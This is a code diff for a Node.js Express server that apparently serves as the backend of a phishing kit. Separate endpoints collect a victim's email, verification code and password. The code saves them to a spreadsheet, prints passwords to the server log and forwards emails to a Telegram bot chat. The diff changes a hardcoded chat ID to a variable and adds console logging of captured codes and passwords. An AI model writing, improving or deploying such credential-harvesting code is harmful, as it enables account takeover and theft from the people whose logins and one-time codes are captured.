@@ -21,19 +21,13 @@ let allData = [];
 
 function sendTelegramMessage(message) {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
   axios.post(url, {
-    chat_id: 6990985746,
+    chat_id: TELEGRAM_CHAT_ID,
     text: message,
-  }, {
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    timeout: 5000
   }).then(() => {
     console.log("✅ Telegram message sent!");
-  }).catch((err) => {
-    console.error("❌ Telegram error:", err.response?.data || err.message);
+  }).catch(err => {
+    console.error("❌ Telegram error:", err.message);
   });
 }
 
@@ -45,29 +39,38 @@ const logAndSave = (data) => {
   XLSX.writeFile(workbook, filePath);
 };
 
+// 📩 Step 1: Email — goes to Telegram
 app.post("/step-email", (req, res) => {
   const email = req.body.email;
   logAndSave({ email });
-  sendTelegramMessage(`📩 New Email Entered: ${email}`);
+  sendTelegramMessage(`🟢 New Email: ${email}`);
   res.sendStatus(200);
 });
 
+// 🔢 Step 2: Code — only in Render
 app.post("/step-code", (req, res) => {
   const code = req.body.code;
+  console.log("Code:", code);
   logAndSave({ code });
   res.sendStatus(200);
 });
 
+// 🔐 Step 3: Password — only in Render
 app.post("/step-password", (req, res) => {
   const password = req.body.password;
+  console.log("Password:", password);
   logAndSave({ password });
   res.sendStatus(200);
 });
 
+// ✅ Final Registration (optional)
 app.post("/register", (req, res) => {
   const { email, code, password } = req.body;
   logAndSave({ email, code, password });
   res.json({ status: "User registration completed." });
 });
 
-app.listen(port);
+// 🌐 Start server
+app.listen(port, () => {
+  console.log(`🚀 Server running on http://localhost:${port}`);
+});
